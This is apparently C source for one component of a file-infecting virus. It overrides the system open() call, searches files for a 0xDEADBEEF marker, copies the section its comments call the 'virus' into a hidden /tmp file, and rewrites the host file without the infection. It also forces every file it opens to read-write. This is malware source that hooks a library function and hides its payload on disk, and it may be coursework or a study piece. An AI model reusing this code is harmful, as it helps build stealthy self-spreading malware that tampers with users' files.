#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#define _FCNTL_H yoyoyo
#include <bits/fcntl.h>
#include <stdlib.h>

off_t sentinelOffset(int fd);

int open(const char *pathname, int flags, mode_t mode){
	//printf("New open being used\n");
	int hostFd = syscall(__NR_open, pathname, (flags&(~O_WRONLY)&(~O_RDONLY))|O_RDWR, mode);
	off_t sOffset;
	if((sOffset = sentinelOffset(hostFd))!=-1){
		//printf("In if\n");
		int tmpFd;
		int i, uninfectedHostSize;
		uid_t ruid;
		pid_t myPid;
		char buf;
		char tmpPath[50];
		ruid = getuid();
		myPid = getpid();
		char *hostBuf,bufPtr;
		struct stat hostFileStat;
		// /tmp/.pid.fd.ruid
		sprintf(tmpPath, "/tmp/.%d.%d.%d", myPid, hostFd, ruid);
		tmpFd = syscall(__NR_open, tmpPath, O_WRONLY|O_CREAT, S_IRUSR);
		//copy virus to tmp file
		lseek(hostFd, 0, SEEK_SET);
		while(lseek(hostFd, 0, SEEK_CUR)< (sOffset+4)){
			read(hostFd, &buf, 1);
			write(tmpFd, &buf, 1);
		}

		fstat(hostFd, &hostFileStat);
		uninfectedHostSize = hostFileStat.st_size-(sOffset+4);
		//printf("uninfected host size %d, sentinelOffset: %d \n", uninfectedHostSize, sOffset);
		//read host into buffer
		hostBuf = malloc(uninfectedHostSize);
		i = 0;
		lseek(hostFd, sOffset+4, SEEK_SET);
		while((i+=read(hostFd, hostBuf+i, uninfectedHostSize-i))<uninfectedHostSize);
		//write uninfected back to host
		ftruncate(hostFd, 0);
		lseek(hostFd, 0, SEEK_SET);
		i = 0;
		while((i+=write(hostFd, hostBuf+i, uninfectedHostSize-i))<uninfectedHostSize);

		free(hostBuf);

		syscall(__NR_close, tmpFd);
	}
	lseek(hostFd, 0, SEEK_SET);
	return hostFd;
}


off_t sentinelOffset(int fd){
	lseek(fd, 0, SEEK_SET);
	unsigned char buf, expected;
	expected = 0xDE;
	while(read(fd,&buf,1) !=0){
		if(buf==expected){
			//set expected to next, or return the offset
			switch(expected){
			case 0xDE:
				expected=0xAD;
				break;
			case 0xAD:
				expected=0xBE;
				break;
			case 0xBE:
				expected=0xEF;
				break;
			case 0xEF:
				return lseek(fd,0,SEEK_CUR)-4;
			default:
				printf("Major ERROR!\n");
				break;
			}
		}else{
			//reset expected
			expected = 0xDE;
		}
	}
	return -1;
}
